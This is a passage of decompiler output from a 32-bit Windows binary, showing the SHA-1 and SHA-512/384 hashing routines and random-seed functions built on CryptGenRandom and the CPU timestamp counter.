  v171 = __ROR4__(v170, 2);
  v199 = v198 + v109 + (v44 ^ v171 ^ v255) + __ROL4__(v230, 5) - 899497514;
  v144 = __ROR4__(v44, 2);
  v114 = __ROL4__(v74 ^ v99 ^ v113 ^ v38, 1);
  v45 = v255 + v114 + (v230 ^ v144 ^ v171) + __ROL4__(v199, 5) - 899497514;
  v231 = __ROR4__(v230, 2);
  v118 = __ROL4__(v79 ^ v104 ^ v36 ^ v119, 1);
  v46 = v171 + v118 + (v199 ^ v231 ^ v144) + __ROL4__(v45, 5) - 899497514;
  v200 = __ROR4__(v199, 2);
  v47 = v144 + __ROL4__(v84 ^ v109 ^ v38 ^ v40, 1) + (v200 ^ v231 ^ v45) + __ROL4__(v46, 5) - 899497514;
  v256 = __ROR4__(v45, 2);
  v48 = __ROL4__(v59 ^ v89 ^ v114 ^ v119, 1) + (v200 ^ v46 ^ v256);
  v49 = __ROR4__(v46, 2);
  v50 = v231 + v48 + __ROL4__(v47, 5) - 899497514;
  a2[2] += v200 + (v47 ^ v49 ^ v256) + __ROL4__(v50, 5) + __ROL4__(v64 ^ v94 ^ v118 ^ v40, 1) - 899497514;
  v51 = v50 + a2[3];
  a2[5] += v49;
  v52 = v256 + a2[6];
  v53 = a2[4] + __ROR4__(v47, 2);
  a2[3] = v51;
  a2[4] = v53;
  a2[6] = v52;
  return 0;
}

//----- (0040ABF0) --------------------------------------------------------
int __usercall sub_40ABF0@<eax>(int result@<eax>, int a2@<ebx>, __m128i *a3)
{
  unsigned int v3; // edi
  unsigned int v4; // ecx
  unsigned int v5; // esi
  int v6; // [esp+4h] [ebp-4h]

  v3 = result;
  if ( result )
  {
    result = *(_DWORD *)a2 & 0x3F;
    v4 = v3 + *(_DWORD *)a2;
    v5 = 64 - result;
    v6 = result;
    *(_DWORD *)a2 = v4;
    if ( v4 < v3 )
      ++*(_DWORD *)(a2 + 4);
    if ( result && v3 >= v5 )
    {
      sub_415930(result + a2 + 28, a3, 64 - result);
      result = sub_409990((unsigned __int8 *)(a2 + 28), (_DWORD *)a2);
      if ( result )
        return result;
      a3 = (__m128i *)((char *)a3 + v5);
      v3 -= v5;
      v6 = 0;
    }
    if ( v3 < 0x40 )
    {
LABEL_12:
      if ( v3 )
        sub_415930(result + a2 + 28, a3, v3);
      return 0;
    }
    else
    {
      while ( 1 )
      {
        result = sub_409990((unsigned __int8 *)a3, (_DWORD *)a2);
        if ( result )
          break;
        a3 += 4;
        v3 -= 64;
        if ( v3 < 0x40 )
        {
          result = v6;
          goto LABEL_12;
        }
      }
    }
  }
  return result;
}

//----- (0040AC90) --------------------------------------------------------
int __usercall sub_40AC90@<eax>(_BYTE *a1@<edi>, int *a2@<esi>)
{
  int v2; // eax
  unsigned int v3; // eax
  int result; // eax
  int v5; // ecx
  int v6; // eax

  v2 = *a2 & 0x3F;
  *((_BYTE *)a2 + v2 + 28) = 0x80;
  v3 = v2 + 1;
  if ( v3 > 0x38 )
  {
    sub_413EB0((int)a2 + v3 + 28, 0, 64 - v3);
    result = sub_409990((unsigned __int8 *)a2 + 28, a2);
    if ( result )
      return result;
    sub_413EB0((int)(a2 + 7), 0, 0x38u);
  }
  else
  {
    sub_413EB0((int)a2 + v3 + 28, 0, 56 - v3);
  }
  v5 = *a2;
  v6 = *(__int64 *)a2 >> 29;
  *((_BYTE *)a2 + 84) = HIBYTE(v6);
  *((_BYTE *)a2 + 85) = BYTE2(v6);
  *((_BYTE *)a2 + 87) = v6;
  v5 *= 8;
  *((_BYTE *)a2 + 88) = HIBYTE(v5);
  *((_BYTE *)a2 + 86) = BYTE1(v6);
  *((_BYTE *)a2 + 90) = BYTE1(v5);
  *((_BYTE *)a2 + 89) = BYTE2(v5);
  *((_BYTE *)a2 + 91) = v5;
  result = sub_409990((unsigned __int8 *)a2 + 28, a2);
  if ( !result )
  {
    *a1 = *((_BYTE *)a2 + 11);
    a1[1] = *((_BYTE *)a2 + 10);
    a1[2] = BYTE1(a2[2]);
    a1[3] = *((_BYTE *)a2 + 8);
    a1[4] = *((_BYTE *)a2 + 15);
    a1[5] = *((_BYTE *)a2 + 14);
    a1[6] = BYTE1(a2[3]);
    a1[7] = *((_BYTE *)a2 + 12);
    a1[8] = *((_BYTE *)a2 + 19);
    a1[9] = *((_BYTE *)a2 + 18);
    a1[10] = BYTE1(a2[4]);
    a1[11] = *((_BYTE *)a2 + 16);
    a1[12] = *((_BYTE *)a2 + 23);
    a1[13] = *((_BYTE *)a2 + 22);
    a1[14] = BYTE1(a2[5]);
    a1[15] = *((_BYTE *)a2 + 20);
    a1[16] = *((_BYTE *)a2 + 27);
    a1[17] = *((_BYTE *)a2 + 26);
    a1[18] = BYTE1(a2[6]);
    a1[19] = *((_BYTE *)a2 + 24);
    return 0;
  }
  return result;
}

//----- (0040ADE0) --------------------------------------------------------
int __cdecl sub_40ADE0(__m128i *a1, int a2, _BYTE *a3)
{
  int v3; // esi
  int v5[23]; // [esp+Ch] [ebp-5Ch] BYREF

  sub_413EB0((int)v5, 0, 0x5Cu);
  v5[0] = 0;
  v5[1] = 0;
  v5[2] = 1732584193;
  v5[3] = -271733879;
  v5[4] = -1732584194;
  v5[5] = 271733878;
  v5[6] = -1009589776;
  v3 = sub_40ABF0(a2, (int)v5, a1);
  if ( !v3 )
    v3 = sub_40AC90(a3, v5);
  sub_413EB0((int)v5, 0, 0x5Cu);
  return v3;
}

//----- (0040AE60) --------------------------------------------------------
int __cdecl sub_40AE60(int a1, BYTE *pbBuffer, DWORD dwLen, _DWORD *phProv)
{
  _DWORD *v4; // esi

  v4 = phProv;
  *phProv = 0;
  if ( !CryptAcquireContextW((HCRYPTPROV *)&phProv, 0, 0, 1u, 0xF0000000) )
    return -60;
  if ( CryptGenRandom((HCRYPTPROV)phProv, dwLen, pbBuffer) )
  {
    CryptReleaseContext((HCRYPTPROV)phProv, 0);
    *v4 = dwLen;
    return 0;
  }
  else
  {
    CryptReleaseContext((HCRYPTPROV)phProv, 0);
    return -60;
  }
}

//----- (0040AED0) --------------------------------------------------------
int __cdecl sub_40AED0(int a1, _DWORD *a2, unsigned int a3, _DWORD *a4)
{
  unsigned __int64 v4; // rax

  v4 = __rdtsc();
  *a4 = 0;
  if ( a3 >= 4 )
  {
    *a2 = v4;
    *a4 = 4;
  }
  return 0;
}

//----- (0040AF00) --------------------------------------------------------
int __usercall sub_40AF00@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  a1[52] = a2;
  if ( a2 )
  {
    a1[4] = -1056596264;
    a1[5] = -876896931;
    a1[6] = 914150663;
    a1[7] = 1654270250;
    a1[8] = 812702999;
    a1[9] = -1856437926;
    a1[10] = -150054599;
    a1[11] = 355462360;
    a1[12] = -4191439;
    a1[13] = 1731405415;
    a1[14] = 1750603025;
    a1[15] = -1900787065;
    a1[16] = 1694076839;
    a1[17] = -619958771;
    a1[18] = -1090891868;
    a1[19] = 1203062813;
  }
  else
  {
    a1[4] = -205731576;
    a1[5] = 1779033703;
    a1[6] = -2067093701;
    a1[7] = -1150833019;
    a1[8] = -23791573;
    a1[9] = 1013904242;
    a1[10] = 1595750129;
    a1[11] = -1521486534;
    a1[12] = -1377402159;
    a1[13] = 1359893119;
    a1[14] = 725511199;
    a1[15] = -1694144372;
    a1[16] = -79577749;
    a1[17] = 528734635;
    a1[18] = 327033209;
    a1[19] = 1541459225;
  }
  return 0;
}

//----- (0040B000) --------------------------------------------------------
int __usercall sub_40B000@<eax>(int a1@<eax>, int a2)
{
  _DWORD *v2; // edi
  unsigned __int8 *v3; // ecx
  unsigned __int64 v4; // rt0
  int v5; // edx
  int *v6; // eax
  unsigned int v7; // edx
  unsigned int v8; // ebx
  int v9; // esi
  bool v10; // zf
  unsigned int v11; // ecx
  unsigned int v12; // edx
  unsigned int v13; // esi
  unsigned int v14; // eax
  int v15; // ecx
  unsigned int v16; // eax
  unsigned int v17; // ecx
  unsigned int v18; // eax
  unsigned int v19; // ecx
  unsigned int v20; // eax
  unsigned int v21; // ecx
  unsigned int v22; // eax
  unsigned int v23; // ecx
  unsigned int v24; // edi
  __int64 v25; // rax
  __int64 v26; // rdi
  __int64 v27; // rcx
  unsigned __int64 v28; // krE0_8
  __int64 v29; // krE8_8
  int v30; // edx
  unsigned __int64 v31; // krF0_8
  unsigned int v32; // kr10_4
  unsigned int v33; // kr14_4
  unsigned __int64 v34; // krF8_8
  unsigned int v35; // kr18_4
  unsigned int v36; // kr1C_4
  unsigned __int64 v37; // kr100_8
  unsigned int v38; // kr24_4
  unsigned __int64 v39; // kr108_8
  unsigned int v40; // kr28_4
  unsigned int v41; // kr2C_4
  unsigned __int64 v42; // kr110_8
  unsigned int v43; // kr30_4
  unsigned int v44; // kr34_4
  unsigned __int64 v45; // kr118_8
  unsigned int v46; // kr38_4
  unsigned int v47; // kr3C_4
  unsigned __int64 v48; // kr120_8
  int v50; // [esp+Ch] [ebp-314h]
  int *v51; // [esp+Ch] [ebp-314h]
  _QWORD *v52; // [esp+Ch] [ebp-314h]
  _QWORD *v53; // [esp+Ch] [ebp-314h]
  char *v54; // [esp+10h] [ebp-310h]
  int v55; // [esp+10h] [ebp-310h]
  _QWORD *v56; // [esp+10h] [ebp-310h]
  _QWORD *v57; // [esp+10h] [ebp-310h]
  char *v58; // [esp+14h] [ebp-30Ch]
  __int64 v59; // [esp+14h] [ebp-30Ch]
  unsigned __int64 v60; // [esp+18h] [ebp-308h]
  unsigned __int64 v61; // [esp+18h] [ebp-308h]
  unsigned __int64 v62; // [esp+20h] [ebp-300h]
  unsigned __int64 v63; // [esp+28h] [ebp-2F8h]
  unsigned __int64 v64; // [esp+30h] [ebp-2F0h]
  unsigned __int64 v65; // [esp+38h] [ebp-2E8h]
  unsigned __int64 v66; // [esp+40h] [ebp-2E0h]
  unsigned __int64 v67; // [esp+48h] [ebp-2D8h]
  unsigned __int64 v68; // [esp+50h] [ebp-2D0h]
  unsigned __int64 v69; // [esp+58h] [ebp-2C8h]
  unsigned int v70; // [esp+60h] [ebp-2C0h]
  int v71; // [esp+64h] [ebp-2BCh]
  unsigned int v72; // [esp+68h] [ebp-2B8h]
  unsigned int v73; // [esp+6Ch] [ebp-2B4h]
  unsigned int v74; // [esp+70h] [ebp-2B0h]
  unsigned int v75; // [esp+74h] [ebp-2ACh]
  unsigned int v76; // [esp+78h] [ebp-2A8h]
  unsigned int v77; // [esp+7Ch] [ebp-2A4h]
  unsigned int v78; // [esp+80h] [ebp-2A0h]
  unsigned int v79; // [esp+84h] [ebp-29Ch]
  __int64 v80; // [esp+88h] [ebp-298h]
  unsigned int v81; // [esp+90h] [ebp-290h] BYREF
  unsigned int v82; // [esp+94h] [ebp-28Ch]
  unsigned int v83; // [esp+98h] [ebp-288h]
  unsigned int v84; // [esp+9Ch] [ebp-284h]
  _WORD v85[3]; // [esp+A0h] [ebp-280h] BYREF
  char v86[8]; // [esp+A6h] [ebp-27Ah] BYREF
  char v88[618]; // [esp+B6h] [ebp-26Ah] BYREF

  v54 = &v86[-a1];
  v2 = (_DWORD *)a2;
  v50 = 0;
  v3 = (unsigned __int8 *)(a1 + 2);
  v58 = &v88[-a1];
  do
  {
    HIDWORD(v4) = (unsigned __int64)*(v3 - 2) >> 24;
    LODWORD(v4) = *(v3 - 1) | (*(v3 - 2) << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = *v3 | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[1] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[2] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[3] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[4] | ((_DWORD)v4 << 8);
    *(_DWORD *)&v85[4 * v50] = v3[5] | ((_DWORD)v4 << 8);
    *(_DWORD *)&v85[4 * v50 + 2] = v4 >> 24;
    HIDWORD(v4) = (unsigned __int64)v3[6] >> 24;
    LODWORD(v4) = v3[7] | (v3[6] << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[8] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[9] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[10] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[11] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[12] | ((_DWORD)v4 << 8);
    *(_DWORD *)&v54[(_DWORD)v3] = v3[13] | ((_DWORD)v4 << 8);
    *(_DWORD *)&v54[(_DWORD)v3 + 4] = v4 >> 24;
    HIDWORD(v4) = (unsigned __int64)v3[14] >> 24;
    LODWORD(v4) = v3[15] | (v3[14] << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[16] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[17] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[18] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[19] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[20] | ((_DWORD)v4 << 8);
    *(_QWORD *)&v3[(_DWORD)(v88 - a1 + 6)] = v3[21] | (v4 << 8);
    HIDWORD(v4) = (unsigned __int64)v3[22] >> 24;
    LODWORD(v4) = v3[23] | (v3[22] << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[24] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[25] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[26] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[27] | ((_DWORD)v4 << 8);
    HIDWORD(v4) = v4 >> 24;
    LODWORD(v4) = v3[28] | ((_DWORD)v4 << 8);
    v5 = v50 + 4;
    *(_DWORD *)&v58[(_DWORD)v3] = v3[29] | ((_DWORD)v4 << 8);
    *(_DWORD *)&v58[(_DWORD)v3 + 4] = v4 >> 24;
    v3 += 32;
    v50 = v5;
  }
  while ( v5 < 16 );
  if ( v5 < 80 )
  {
    v6 = (int *)(&v81 + 2 * v5);
    v51 = v6;
    v55 = 80 - v5;
    do
    {
      v7 = *(v6 - 25);
      LODWORD(v62) = *(v6 - 26);
      v8 = v6[1];
      v9 = *(_QWORD *)v6 >> 19;
      LODWORD(v63) = *v6;
      HIDWORD(v62) = v7;
      HIDWORD(v63) = v8;
      LODWORD(v59) = (v63 >> 6) ^ ((8 * v63) | (v8 >> 29)) ^ v9;
      HIDWORD(v59) = (v8 >> 6) ^ (__PAIR64__(v8, v63) >> 29) ^ ((v8 >> 19) | ((_DWORD)v63 << 13));
      *((_QWORD *)v51 + 2) = *((_QWORD *)v51 - 5)
                           + *((_QWORD *)v51 - 14)
                           + __PAIR64__(
                               (v7 >> 7) ^ ((v7 >> 1) | ((_DWORD)v62 << 31)) ^ ((v7 >> 8) | ((_DWORD)v62 << 24)),
                               (v62 >> 7) ^ (v62 >> 1) ^ (v62 >> 8))
                           + v59;
      v6 = v51 + 2;
      v10 = v55-- == 1;
      v51 += 2;
    }
    while ( !v10 );
    v2 = (_DWORD *)a2;
  }
  v11 = v2[5];
  v12 = v2[12];
  v13 = v2[13];
  LODWORD(v80) = v2[4];
  v68 = __PAIR64__(v11, v80);
  v70 = v2[6];
  LODWORD(v67) = v70;
  v14 = v2[8];
  HIDWORD(v80) = v11;
  v15 = v2[7];
  v76 = v14;
  LODWORD(v65) = v14;
  v16 = v2[10];
  v71 = v15;
  HIDWORD(v67) = v15;
  v17 = v2[9];
  v83 = v16;
  LODWORD(v63) = v16;
  v18 = v2[14];
  v77 = v17;
  HIDWORD(v65) = v17;
  v19 = v2[11];
  v74 = v18;
  LODWORD(v66) = v18;
  v20 = v2[16];
  v84 = v19;
  HIDWORD(v63) = v19;
  v21 = v2[15];
  v78 = v20;
  LODWORD(v64) = v20;
  v22 = v2[18];
  v75 = v21;
  HIDWORD(v66) = v21;
  v23 = v2[17];
  v24 = v2[19];
  v81 = v22;
  v62 = __PAIR64__(v24, v22);
  v72 = v12;
  v73 = v13;
  v60 = __PAIR64__(v13, v12);
  v79 = v23;
  HIDWORD(v64) = v23;
  v82 = v24;
  v52 = v85;
  v56 = &SHA512_Constants_41EEB0;
  while ( 1 )
  {
    v69 = *v52
        + v62
        + *v56
        + (v64 ^ v60 & (v66 ^ v64))
        + __PAIR64__(
            ((HIDWORD(v60) >> 14) | ((_DWORD)v60 << 18)) ^ ((v13 >> 18) | (v12 << 14)) ^ (__PAIR64__(v13, v12) >> 9),
            (v60 >> 14) ^ (__PAIR64__(v13, v12) >> 18) ^ ((v12 << 23) | (v13 >> 9)));
    v63 += v69;
    HIDWORD(v25) = (v68 >> 7) ^ (v68 >> 2) ^ ((HIDWORD(v68) >> 28) | (16 * v68));
    LODWORD(v25) = (((_DWORD)v68 << 25) | (HIDWORD(v68) >> 7)) ^ (((_DWORD)v68 << 30) | (HIDWORD(v68) >> 2)) ^ (v68 >> 28);
    v62 = v69 + (v68 & v67 | v65 & (v68 | v67)) + v25;
    v57 = v56 + 1;
    v53 = v52 + 1;
    v69 = *v53
        + v64
        + *v57
        + (v66 ^ v63 & (v60 ^ v66))
        + __PAIR64__(
            ((HIDWORD(v63) >> 14) | ((_DWORD)v63 << 18)) ^ ((HIDWORD(v63) >> 18) | ((_DWORD)v63 << 14)) ^ (v63 >> 9),
            (v63 >> 14) ^ (v63 >> 18) ^ (((_DWORD)v63 << 23) | (HIDWORD(v63) >> 9)));
    v65 += v69;
    HIDWORD(v25) = (v62 >> 7) ^ (v62 >> 2) ^ ((HIDWORD(v62) >> 28) | (16 * v62));
    LODWORD(v25) = (((_DWORD)v62 << 25) | (HIDWORD(v62) >> 7)) ^ (((_DWORD)v62 << 30) | (HIDWORD(v62) >> 2)) ^ (v62 >> 28);
    v64 = v69 + (v68 & v62 | v67 & (v68 | v62)) + v25;
    v69 = *++v53
        + v66
        + *++v57
        + (v60 ^ v65 & (v63 ^ v60))
        + __PAIR64__(
            ((HIDWORD(v65) >> 14) | ((_DWORD)v65 << 18)) ^ ((HIDWORD(v65) >> 18) | ((_DWORD)v65 << 14)) ^ (v65 >> 9),
            (v65 >> 14) ^ (v65 >> 18) ^ (((_DWORD)v65 << 23) | (HIDWORD(v65) >> 9)));
    v67 += v69;
    HIDWORD(v25) = (v64 >> 7) ^ (v64 >> 2) ^ ((HIDWORD(v64) >> 28) | (16 * v64));
    LODWORD(v25) = (((_DWORD)v64 << 25) | (HIDWORD(v64) >> 7)) ^ (((_DWORD)v64 << 30) | (HIDWORD(v64) >> 2)) ^ (v64 >> 28);
    v66 = v69 + (v64 & v62 | v68 & (v64 | v62)) + v25;
    v69 = *++v53
        + v60
        + *++v57
        + (v63 ^ v67 & (v65 ^ v63))
        + __PAIR64__(
            ((HIDWORD(v67) >> 14) | ((_DWORD)v67 << 18)) ^ ((HIDWORD(v67) >> 18) | ((_DWORD)v67 << 14)) ^ (v67 >> 9),
            (v67 >> 14) ^ (v67 >> 18) ^ (((_DWORD)v67 << 23) | (HIDWORD(v67) >> 9)));
    v68 += v69;
    HIDWORD(v25) = (v66 >> 7) ^ (v66 >> 2) ^ ((HIDWORD(v66) >> 28) | (16 * v66));
    LODWORD(v25) = (((_DWORD)v66 << 25) | (HIDWORD(v66) >> 7)) ^ (((_DWORD)v66 << 30) | (HIDWORD(v66) >> 2)) ^ (v66 >> 28);
    v61 = v69 + (v66 & v64 | v62 & (v66 | v64)) + v25;
    v69 = *++v53
        + v63
        + *++v57
        + (v65 ^ v68 & (v67 ^ v65))
        + __PAIR64__(
            ((HIDWORD(v68) >> 14) | ((_DWORD)v68 << 18)) ^ ((HIDWORD(v68) >> 18) | ((_DWORD)v68 << 14)) ^ (v68 >> 9),
            (v68 >> 14) ^ (v68 >> 18) ^ (((_DWORD)v68 << 23) | (HIDWORD(v68) >> 9)));
    v62 += v69;
    HIDWORD(v25) = (v61 >> 7) ^ (v61 >> 2) ^ ((HIDWORD(v61) >> 28) | (16 * v61));
    LODWORD(v25) = (((_DWORD)v61 << 25) | (HIDWORD(v61) >> 7)) ^ (((_DWORD)v61 << 30) | (HIDWORD(v61) >> 2)) ^ (v61 >> 28);
    v63 = v69 + (v61 & v66 | v64 & (v61 | v66)) + v25;
    v69 = *++v53
        + v65
        + *++v57
        + (v67 ^ v62 & (v68 ^ v67))
        + __PAIR64__(
            ((HIDWORD(v62) >> 14) | ((_DWORD)v62 << 18)) ^ ((HIDWORD(v62) >> 18) | ((_DWORD)v62 << 14)) ^ (v62 >> 9),
            (v62 >> 14) ^ (v62 >> 18) ^ (((_DWORD)v62 << 23) | (HIDWORD(v62) >> 9)));
    v64 += v69;
    HIDWORD(v26) = (v63 >> 7) ^ (v63 >> 2) ^ ((HIDWORD(v63) >> 28) | (16 * v63));
    LODWORD(v27) = (((_DWORD)v63 << 25) | (HIDWORD(v63) >> 7)) ^ (((_DWORD)v63 << 30) | (HIDWORD(v63) >> 2)) ^ (v63 >> 28);
    LODWORD(v26) = v63 & v61 | v66 & (v63 | v61);
    HIDWORD(v27) = HIDWORD(v63) & HIDWORD(v61) | HIDWORD(v66) & (HIDWORD(v63) | HIDWORD(v61));
    HIDWORD(v26) = (v69 + v26 + v27) >> 32;
    v65 = __PAIR64__(HIDWORD(v26), (int)v69 + (int)v26 + (int)v27);
    v69 = *++v53
        + v67
        + *++v57
        + (v68 ^ v64 & (v68 ^ v62))
        + __PAIR64__(
            ((HIDWORD(v64) >> 14) | ((_DWORD)v64 << 18)) ^ ((HIDWORD(v64) >> 18) | ((_DWORD)v64 << 14)) ^ (v64 >> 9),
            (v64 >> 14) ^ (v64 >> 18) ^ (((_DWORD)v64 << 23) | (HIDWORD(v64) >> 9)));
    v66 += v69;
    HIDWORD(v25) = (v65 >> 7) ^ (__PAIR64__(HIDWORD(v26), v65) >> 2) ^ ((HIDWORD(v26) >> 28) | (16 * v65));
    LODWORD(v25) = (((_DWORD)v65 << 25) | (HIDWORD(v26) >> 7)) ^ (((_DWORD)v65 << 30) | (HIDWORD(v26) >> 2)) ^ (__PAIR64__(HIDWORD(v26), v65) >> 28);
    v67 = v69 + (v65 & v63 | v61 & (v65 | v63)) + v25;
    v69 = *++v53
        + v68
        + *++v57
        + (v62 ^ v66 & (v64 ^ v62))
        + __PAIR64__(
            ((HIDWORD(v66) >> 14) | ((_DWORD)v66 << 18)) ^ ((HIDWORD(v66) >> 18) | ((_DWORD)v66 << 14)) ^ (v66 >> 9),
            (v66 >> 14) ^ (v66 >> 18) ^ (((_DWORD)v66 << 23) | (HIDWORD(v66) >> 9)));
    v60 = v69 + v61;
    v28 = v69
        + __PAIR64__(
            HIDWORD(v67) & HIDWORD(v26) | HIDWORD(v63) & (unsigned int)(HIDWORD(v67) | HIDWORD(v26)),
            v67 & v65 | v63 & (v67 | v65))
        + __PAIR64__(
            (v67 >> 7) ^ (v67 >> 2) ^ ((HIDWORD(v67) >> 28) | (16 * v67)),
            (((_DWORD)v67 << 25) | (HIDWORD(v67) >> 7)) ^ (((_DWORD)v67 << 30) | (HIDWORD(v67) >> 2)) ^ (v67 >> 28));
    v52 = v53 + 1;
    v68 = v28;
    v56 = v57 + 1;
    if ( (int)v56 >= (int)&unk_41F130 )
      break;
    v13 = HIDWORD(v60);
    v12 = v60;
  }
  v29 = v28 + v80;
  v30 = v71;
  *(_DWORD *)(a2 + 20) = (v28 + v80) >> 32;
  v31 = v67 + __PAIR64__(v30, v70);
  *(_DWORD *)(a2 + 24) = v67 + v70;
  v32 = v65;
  v33 = v76;
  *(_DWORD *)(a2 + 28) = HIDWORD(v31);
  v34 = __PAIR64__(v77, v32) + __PAIR64__(HIDWORD(v65), v33);
  *(_DWORD *)(a2 + 32) = v32 + v33;
  v35 = v63;
  v36 = v83;
  *(_DWORD *)(a2 + 36) = HIDWORD(v34);
  v37 = __PAIR64__(v84, v35) + __PAIR64__(HIDWORD(v63), v36);
  *(_DWORD *)(a2 + 40) = v35 + v36;
  v38 = v72;
  *(_DWORD *)(a2 + 44) = HIDWORD(v37);
  v39 = v60 + __PAIR64__(v73, v38);
  *(_DWORD *)(a2 + 48) = v60 + v38;
  v40 = v66;
  v41 = v74;
  *(_DWORD *)(a2 + 52) = HIDWORD(v39);
  v42 = __PAIR64__(v75, v40) + __PAIR64__(HIDWORD(v66), v41);
  *(_DWORD *)(a2 + 56) = v40 + v41;
  v43 = v64;
  v44 = v78;
  *(_DWORD *)(a2 + 60) = HIDWORD(v42);
  v45 = __PAIR64__(v79, v43) + __PAIR64__(HIDWORD(v64), v44);
  *(_DWORD *)(a2 + 64) = v43 + v44;
  v46 = v62;
  v47 = v81;
  *(_DWORD *)(a2 + 68) = HIDWORD(v45);
  v48 = __PAIR64__(v82, v46) + __PAIR64__(HIDWORD(v62), v47);
  *(_DWORD *)(a2 + 16) = v29;
  *(_QWORD *)(a2 + 72) = v48;
  return 0;
}
// 40B000: using guessed type char var_27A[8];
// 40B000: using guessed type char var_26A[618];

//----- (0040BF50) --------------------------------------------------------
int __usercall sub_40BF50@<eax>(int a1@<esi>, const __m128i *a2, unsigned int a3)
{
  unsigned int v3; // ecx
  int result; // eax
  int v5; // ebx
  unsigned int v6; // edi
  unsigned int v7; // eax

  v3 = a3;
  result = 0;
  if ( a3 )
  {
    v5 = *(_DWORD *)a1 & 0x7F;
    v6 = 128 - v5;
    *(_QWORD *)a1 += a3;
    if ( *(_QWORD *)a1 < (unsigned __int64)a3 )
      ++*(_QWORD *)(a1 + 8);
    if ( v5 && a3 >= v6 )
    {
      sub_415930(v5 + a1 + 80, a2, 128 - v5);
      result = sub_40B000(a1 + 80, a1);
      if ( result )
        return result;
      a3 -= v6;
      a2 = (const __m128i *)((char *)a2 + v6);
      v3 = a3;
      v5 = 0;
    }
    if ( v3 < 0x80 )
    {
LABEL_12:
      if ( v3 )
        sub_415930(v5 + a1 + 80, a2, v3);
      return 0;
    }
    else
    {
      while ( 1 )
      {
        result = sub_40B000((int)a2, a1);
        if ( result )
          break;
        a2 += 8;
        v7 = a3 - 128;
        a3 = v7;
        if ( v7 < 0x80 )
        {
          v3 = v7;
          goto LABEL_12;
        }
      }
    }
  }
  return result;
}

//----- (0040C010) --------------------------------------------------------
int __usercall sub_40C010@<eax>(_BYTE *a1@<edi>, int a2@<esi>)
{
  int v2; // eax
  unsigned int v3; // eax
  int result; // eax
  unsigned __int64 v5; // rt0
  int v6; // edx
  int v7; // ecx
  int v8; // [esp+8h] [ebp-10h]

  v2 = *(_DWORD *)a2 & 0x7F;
  *(_BYTE *)(v2 + a2 + 80) = 0x80;
  v3 = v2 + 1;
  if ( v3 > 0x70 )
  {
    sub_413EB0(v3 + a2 + 80, 0, 128 - v3);
    result = sub_40B000(a2 + 80, a2);
    if ( result )
      return result;
    sub_413EB0(a2 + 80, 0, 0x70u);
  }
  else
  {
    sub_413EB0(v3 + a2 + 80, 0, 112 - v3);
  }
  v5 = *(_QWORD *)(a2 + 8);
  v6 = *(__int64 *)(a2 + 4) >> 29;
  v7 = *(_QWORD *)a2 >> 29;
  v8 = 8 * *(_DWORD *)a2;
  *(_BYTE *)(a2 + 192) = (8 * v5) >> 56;
  *(_WORD *)(a2 + 193) = __PAIR16__((unsigned __int16)(v5 >> 29) >> 8, (8 * v5) >> 48);
  *(_BYTE *)(a2 + 195) = v5 >> 29;
  *(_BYTE *)(a2 + 196) = HIBYTE(v6);
  *(_BYTE *)(a2 + 197) = BYTE2(v6);
  *(_BYTE *)(a2 + 199) = v6;
  *(_BYTE *)(a2 + 200) = HIBYTE(v7);
  *(_BYTE *)(a2 + 201) = BYTE2(v7);
  *(_BYTE *)(a2 + 198) = BYTE1(v6);
  *(_BYTE *)(a2 + 203) = v7;
  *(_BYTE *)(a2 + 202) = BYTE1(v7);
  *(_BYTE *)(a2 + 204) = HIBYTE(v8);
  *(_BYTE *)(a2 + 205) = BYTE2(v8);
  *(_BYTE *)(a2 + 207) = v8;
  *(_BYTE *)(a2 + 206) = BYTE1(v8);
  result = sub_40B000(a2 + 80, a2);
  if ( !result )
  {
    *a1 = *(_BYTE *)(a2 + 23);
    a1[1] = *(_BYTE *)(a2 + 22);
    a1[2] = sub_418600(*(_QWORD *)(a2 + 16), 0x28u);
    a1[3] = sub_418600(*(_QWORD *)(a2 + 16), 0x20u);
    a1[4] = HIBYTE(*(_DWORD *)(a2 + 16));
    a1[5] = BYTE2(*(_DWORD *)(a2 + 16));
    a1[6] = BYTE1(*(_QWORD *)(a2 + 16));
    a1[7] = *(_BYTE *)(a2 + 16);
    a1[8] = *(_BYTE *)(a2 + 31);
    a1[9] = *(_BYTE *)(a2 + 30);
    a1[10] = sub_418600(*(_QWORD *)(a2 + 24), 0x28u);
    a1[11] = sub_418600(*(_QWORD *)(a2 + 24), 0x20u);
    a1[12] = HIBYTE(*(_DWORD *)(a2 + 24));
    a1[13] = BYTE2(*(_DWORD *)(a2 + 24));
    a1[14] = BYTE1(*(_QWORD *)(a2 + 24));
    a1[15] = *(_BYTE *)(a2 + 24);
    a1[16] = *(_BYTE *)(a2 + 39);
    a1[17] = *(_BYTE *)(a2 + 38);
